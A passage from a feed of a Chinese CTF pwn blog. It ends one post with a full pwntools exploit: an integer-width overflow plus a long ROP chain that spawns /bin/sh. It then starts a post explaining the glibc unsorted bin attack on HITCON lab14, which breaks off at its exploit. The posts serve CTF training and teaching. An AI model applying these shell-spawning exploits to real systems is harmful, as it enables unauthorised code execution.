class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000042660f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000047c601</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401696</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000442e46</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000042660f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004003da</span>) <span class="comment"># syscall</span></span><br></pre></td></tr></table></figure><p>于是利用思路如下：</p><ol><li>输入构造的数字使read参数极大</li><li>填充到retn位置</li><li>填充rop利用链</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">p=process(<span class="string">'./intoverflow'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca080</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000480956</span>) <span class="comment"># pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line">payload += <span class="string">'/bin//sh'</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000047c601</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000042660f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000047c601</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401696</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca080</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000442e46</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000042660f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">payload += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004003da</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Plz Input Your weight(kg):\n&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'4294967290'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Good! what\'s your name??\n&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/由寄存器位数差异引发的漏洞利用/">https://kabeor.github.io/由寄存器位数差异引发的漏洞利用/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;由寄存器位数差异引发的漏洞利用&quot;&gt;&lt;a href=&quot;#由寄存器位数差异引发的漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;由寄存器位数差异引发的漏洞利用&quot;&gt;&lt;/a&gt;由寄存器位数差异引发的漏洞利用&lt;/h1&gt;&lt;figure class=&quot;highli
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Unsorted Bin Attack</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Unsorted%20Bin%20Attack/"/>
    <id>https://kabeor.github.io/堆溢出-Unsorted Bin Attack/</id>
    <published>2020-01-15T07:44:17.144Z</published>
    <updated>2020-01-15T07:45:56.651Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Unsorted-Bin-Attack"><a href="#堆溢出-Unsorted-Bin-Attack" class="headerlink" title="堆溢出-Unsorted Bin Attack"></a>堆溢出-Unsorted Bin Attack</h1><p>被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针，可以达到的效果是实现修改任意地址值为一个较大的数值。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="Unsorted-Bin-的产生"><a href="#Unsorted-Bin-的产生" class="headerlink" title="Unsorted Bin 的产生"></a>Unsorted Bin 的产生</h3><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，如果不是和 top chunk 近邻的话，可能会把合并后的 chunk 放到 unsorted bin 中。</li></ol><h3 id="Unsorted-Bin-的使用"><a href="#Unsorted-Bin-的使用" class="headerlink" title="Unsorted Bin 的使用"></a>Unsorted Bin 的使用</h3><ol><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li></ol><p><code>_int_malloc</code> 中，当将一个 unsorted bin 取出的时候，会将 <code>bk-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置，如果我们控制了 bk 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/15/wPq2HpQCOvultFA.png" alt="image.png"></p><p><strong>初始状态时</strong><br>unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。</p><p><strong>执行 free(p)</strong><br>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。</p><p><strong>修改 p[1]</strong><br>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p><p><strong>申请 400 大小的 chunk</strong><br>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks(av)-&gt;bk=p</span><br><span class="line">bck = victim-&gt;bk=p-&gt;bk = target addr<span class="number">-16</span></span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck=target addr<span class="number">-16</span></span><br><span class="line">bck-&gt;fd = *(target addr <span class="number">-16</span>+<span class="number">16</span>) = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><p><strong>在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p><p><strong>作用</strong></p><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样就可以去执行一些 fast bin attack 了。</li></ul><h2 id="例-HITCON-Training-lab14-magic-heap"><a href="#例-HITCON-Training-lab14-magic-heap" class="headerlink" title="例 HITCON Training lab14 magic heap"></a>例 HITCON Training lab14 magic heap</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       Magic Heap Creator       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 1. Create a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 2. Edit a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 3. Delete a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 4. Exit                        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Your choice :"</span>);</span><br><span class="line"></span><br><span class="line">create_heap();</span><br><span class="line">edit_heap(&amp;buf, &amp;buf);</span><br><span class="line">delete_heap(&amp;buf, &amp;buf);</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ol><li>创建堆。根据用户指定大小申请相应堆，并且读入指定长度的内容，但是并没有设置 NULL。</li><li>编辑堆。根据指定的索引判断对应堆是不是非空，如果非空，就根据用户读入的大小，来修改堆的内容，这里出现了任意长度堆溢出的漏洞。</li><li>删除堆。根据指定的索引判断对应堆是不是非空，如果非空，就将对应堆释放并置为 NULL。</li></ol><p>当控制 v3 为 4869，同时控制 magic 大于 4869，就可以得到 flag 。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol><li>释放一个堆块到 unsorted bin 中。</li><li>利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 &amp;magic-16。</li><li>触发漏洞</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span 